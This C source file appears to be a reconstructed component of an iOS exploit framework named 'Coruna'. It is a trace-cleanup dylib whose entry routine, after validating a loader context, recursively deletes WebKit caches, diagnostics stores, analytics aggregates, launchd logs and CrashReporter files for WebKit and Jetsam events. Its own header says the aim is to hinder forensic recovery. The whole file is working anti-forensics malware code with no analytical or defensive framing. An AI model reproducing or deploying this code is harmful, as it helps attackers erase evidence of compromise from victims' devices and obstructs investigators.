/*
 * Coruna type-0x0a extra dylib (entry4 variant) — trace cleanup
 *
 * Purges WebKit caches, crash logs, diagnostics, and launchd logs to hinder
 * forensic recovery. Entry: _startsc (Mach-O export).
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

#define CORUNA_EXTRA_OK              0u
#define CORUNA_EXTRA_ERR_INVALID     0xad001u
#define CORUNA_EXTRA_ERR_ALLOC       0xad009u
#define CORUNA_EXTRA_ERR_DIR         0xad00b
#define CORUNA_EXTRA_ERR_PATH_LEN    0xad00c

#define CORUNA_EXTRA_PATH_MAX        1024
#define CORUNA_EXTRA_DIR_MODE        0755

extern long *__stack_chk_guard;

static uint32_t coruna_extra_errno_status(int err)
{
    if (err <= 0) {
        return (uint32_t)(-err);
    }
    return (uint32_t)err | 0x40000000u;
}

static uint32_t coruna_extra_unlink_path(const char *path)
{
    if (path == NULL || path[0] == '\0') {
        return CORUNA_EXTRA_ERR_INVALID;
    }
    if (unlink(path) == 0) {
        return CORUNA_EXTRA_OK;
    }
    if (errno == ENOENT) {
        return CORUNA_EXTRA_OK;
    }
    return coruna_extra_errno_status(errno);
}

static uint32_t coruna_extra_purge_tree(const char *path, int remove_dir, uint32_t max_age_sec)
{
    struct stat st;
    char child[CORUNA_EXTRA_PATH_MAX];
    DIR *dir;
    struct dirent *ent;
    const char *join_fmt;
    size_t path_len;
    time_t now;
    uint32_t status;
    uint32_t child_status;

    if (path == NULL || path[0] == '\0') {
        return CORUNA_EXTRA_ERR_INVALID;
    }

    now = time(NULL);
    if (lstat(path, &st) != 0) {
        return (errno == ENOENT) ? CORUNA_EXTRA_OK : coruna_extra_errno_status(errno);
    }

    if ((st.st_mode & S_IFMT) != S_IFDIR) {
        if (max_age_sec != 0 && now > st.st_ctimespec.tv_sec &&
            (now - st.st_ctimespec.tv_sec) > (time_t)max_age_sec) {
            return CORUNA_EXTRA_OK;
        }
        return coruna_extra_unlink_path(path);
    }

    chmod(path, CORUNA_EXTRA_DIR_MODE);
    dir = opendir(path);
    if (dir == NULL) {
        return CORUNA_EXTRA_ERR_DIR;
    }

    path_len = strlen(path);
    join_fmt = (path[path_len - 1] == '/') ? "%s%s" : "%s/%s";
    status = CORUNA_EXTRA_OK;

    errno = 0;
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) {
            continue;
        }
        if (snprintf(child, sizeof(child), join_fmt, path, ent->d_name) >= (int)sizeof(child)) {
            status = CORUNA_EXTRA_ERR_PATH_LEN;
            break;
        }
        child_status = coruna_extra_purge_tree(child, 1, max_age_sec);
        if (status == CORUNA_EXTRA_OK && child_status != CORUNA_EXTRA_OK) {
            status = child_status;
        }
        memset(child, 0, sizeof(child));
    }

    if (errno != 0 && status == CORUNA_EXTRA_OK) {
        status = coruna_extra_errno_status(errno);
    }
    if (closedir(dir) != 0) {
        status = CORUNA_EXTRA_ERR_DIR;
    }

    if (status != CORUNA_EXTRA_OK) {
        return status;
    }
    if (remove_dir && rmdir(path) != 0 && errno != ENOENT) {
        return coruna_extra_errno_status(errno);
    }
    return CORUNA_EXTRA_OK;
}

static uint32_t coruna_extra_purge_filtered(const char *root, const char *prefix,
                                            const char *suffix, uint32_t max_age_sec)
{
    struct stat st;
    char child[CORUNA_EXTRA_PATH_MAX];
    DIR *dir;
    struct dirent *ent;
    const char *join_fmt;
    size_t root_len;
    size_t prefix_len;
    size_t suffix_len;
    size_t name_len;
    time_t now;
    uint32_t status;
    uint32_t step;
    bool name_ok;

    if (root == NULL || root[0] == '\0') {
        return CORUNA_EXTRA_ERR_INVALID;
    }

    now = time(NULL);
    if (lstat(root, &st) != 0) {
        return (errno == ENOENT) ? CORUNA_EXTRA_OK : coruna_extra_errno_status(errno);
    }
    if ((st.st_mode & S_IFMT) != S_IFDIR) {
        return CORUNA_EXTRA_ERR_DIR;
    }

    chmod(root, CORUNA_EXTRA_DIR_MODE);
    dir = opendir(root);
    if (dir == NULL) {
        return CORUNA_EXTRA_ERR_DIR;
    }

    root_len = strlen(root);
    join_fmt = (root[root_len - 1] == '/') ? "%s%s" : "%s/%s";
    prefix_len = prefix ? strlen(prefix) : 0;
    suffix_len = suffix ? strlen(suffix) : 0;
    status = CORUNA_EXTRA_OK;

    errno = 0;
    ent = readdir(dir);
    while (ent != NULL) {
        name_ok = (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0);
        if (name_ok) {
            if (snprintf(child, sizeof(child), join_fmt, root, ent->d_name) >= (int)sizeof(child)) {
                status = CORUNA_EXTRA_ERR_PATH_LEN;
                break;
            }
            if (lstat(child, &st) == 0) {
                if ((st.st_mode & S_IFMT) == S_IFDIR) {
                    if (ent->d_name[0] != '\0' && ent->d_name[0] != '.') {
                        step = coruna_extra_purge_filtered(child, prefix, suffix, max_age_sec);
                    } else {
                        step = CORUNA_EXTRA_OK;
                    }
                } else {
                    name_len = strlen(ent->d_name);
                    if (prefix != NULL &&
                        (name_len < prefix_len || strncmp(ent->d_name, prefix, prefix_len) != 0)) {
                        step = CORUNA_EXTRA_OK;
                    } else if (suffix != NULL &&
                               (name_len < suffix_len ||
                                strncmp(ent->d_name + name_len - suffix_len, suffix, suffix_len) != 0)) {
                        step = CORUNA_EXTRA_OK;
                    } else if (max_age_sec != 0 && now > st.st_ctimespec.tv_sec &&
                               (now - st.st_ctimespec.tv_sec) > (time_t)max_age_sec) {
                        step = CORUNA_EXTRA_OK;
                    } else {
                        step = coruna_extra_unlink_path(child);
                    }
                }
                if (status == CORUNA_EXTRA_OK && step != CORUNA_EXTRA_OK) {
                    status = step;
                }
            } else {
                status = CORUNA_EXTRA_ERR_DIR;
            }
            memset(child, 0, sizeof(child));
        }
        errno = 0;
        ent = readdir(dir);
    }

    if (errno != 0 && status == CORUNA_EXTRA_OK) {
        status = coruna_extra_errno_status(errno);
    }
    if (closedir(dir) != 0) {
        status = CORUNA_EXTRA_ERR_DIR;
    }
    return status;
}

static uint64_t coruna_extra_purge_stale_files(const char *dir_path, uint32_t max_age_sec)
{
    struct stat st;
    DIR *dir;
    struct dirent *ent;
    char *full_path;
    size_t base_len;
    size_t full_len;
    char sep;
    time_t now;
    uint64_t status;

    if (dir_path == NULL || dir_path[0] == '\0' || max_age_sec == 0) {
        return CORUNA_EXTRA_ERR_INVALID;
    }

    now = time(NULL);
    dir = opendir(dir_path);
    if (dir == NULL) {
        return CORUNA_EXTRA_ERR_DIR;
    }

    base_len = strlen(dir_path);
    sep = (dir_path[base_len - 1] == '/') ? '\0' : '/';
    status = CORUNA_EXTRA_OK;

    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_type != DT_REG) {
            continue;
        }
        full_len = base_len + (sep ? 1 : 0) + strlen(ent->d_name) + 1;
        full_path = calloc(full_len, 1);
        if (full_path == NULL) {
            status = CORUNA_EXTRA_ERR_ALLOC;
            break;
        }
        strncpy(full_path, dir_path, base_len);
        if (sep) {
            full_path[base_len] = '/';
            strcat(full_path, ent->d_name);
        } else {
            strcat(full_path, ent->d_name);
        }
        if (stat(full_path, &st) == 0 &&
            (now <= st.st_ctimespec.tv_sec ||
             (now - st.st_ctimespec.tv_sec) <= (time_t)max_age_sec)) {
            unlink(full_path);
        }
        memset(full_path, 0, full_len);
        free(full_path);
    }

    closedir(dir);
    return status;
}

void coruna_pacia(void) { }
void coruna_pacda(void) { }
void coruna_pacib(void) { }
void coruna_pacdb(void) { }

typedef struct coruna_extra_ctx coruna_extra_ctx_t;

struct coruna_extra_ctx {
    uint16_t version;
    uint16_t _pad;
    uint64_t (*resolve)(coruna_extra_ctx_t *ctx, uint64_t *out);
    uint64_t (*bind)(coruna_extra_ctx_t *ctx, long *handle, void *key, int op, int flags);
    void (*release)(coruna_extra_ctx_t *ctx, long handle);
    uint64_t (*finalize)(coruna_extra_ctx_t *ctx, long handle);
    void *vtable_slots[8];
};

static const uint64_t k_coruna_extra_bind_key_a = 0x0000000000000008ULL;

short *_startsc(short *ctx, long handle, char *age_config)
{
    coruna_extra_ctx_t *extra_ctx;
    long local_handle;
    uint64_t resolve_out;
    uint32_t max_age_sec;
    bool purge_all;
    uint32_t status;
    long stack_guard;

    stack_guard = *__stack_chk_guard;
    extra_ctx = (coruna_extra_ctx_t *)ctx;
    status = CORUNA_EXTRA_ERR_INVALID;
    local_handle = handle;

    if (extra_ctx == NULL || extra_ctx->version != 4 || extra_ctx->_pad <= 5) {
        goto done;
    }

    resolve_out = 0;
    if ((long)extra_ctx->resolve(extra_ctx, &resolve_out) != 0) {
        goto done;
    }
    if ((resolve_out >> 3) < 1099) {
        status = CORUNA_EXTRA_OK;
        goto done;
    }

    if (extra_ctx->bind(extra_ctx, &local_handle, (void *)&k_coruna_extra_bind_key_a, 2, 0) != 0) {
        goto done;
    }

    setsid();

    if (age_config == NULL || age_config[0] == '\0') {
        purge_all = true;
        max_age_sec = 0;
    } else {
        purge_all = false;
        max_age_sec = *(uint32_t *)(age_config + 4);
    }

    if (purge_all) {
        status = coruna_extra_purge_tree(
            "/private/var/mobile/Library/Caches/com.apple.suggestd/WebKit", 1, max_age_sec);
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/diagnostics/Persist", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/diagnostics/Signpost", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/diagnostics/Special", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/analyticsd/aggregates/Daily", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/analyticsd/aggregates/90Day", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_tree("/private/var/db/analyticsd/aggregates/Never", 0, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/log/com.apple.xpc.launchd", "launchd.log",
                                                 NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/db/diagnostics", "logdata.statistics", NULL,
                                                 max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/mobile/Library/Logs/AppleSupport", "general",
                                                 NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/mobile/Library/Logs/CrashReporter",
                                               "com.apple.WebKit.WebContent", NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/mobile/Library/Logs/CrashReporter",
                                               "ExcUserFault_com.apple.WebKit.WebContent", NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/mobile/Library/Logs/CrashReporter",
                                               "JetsamEvent", NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = coruna_extra_purge_filtered("/private/var/mobile/Library/Logs/CrashReporter",
                                               "com.apple.WebKit.GPU-", NULL, max_age_sec);
        }
        if (status == CORUNA_EXTRA_OK) {
            status = (uint32_t)coruna_extra_purge_stale_files(
                "/private/var/mobile/Library/Logs/CrashReporter", max_age_sec);
        }
    } else {
        status = CORUNA_EXTRA_OK;
    }

    if (handle == 0) {
        extra_ctx->release(extra_ctx, local_handle);
        extra_ctx->finalize(extra_ctx, local_handle);
        local_handle = 0;
    }

done:
    if (*__stack_chk_guard != stack_guard) {
        abort();
    }
    return (short *)(uintptr_t)status;
}
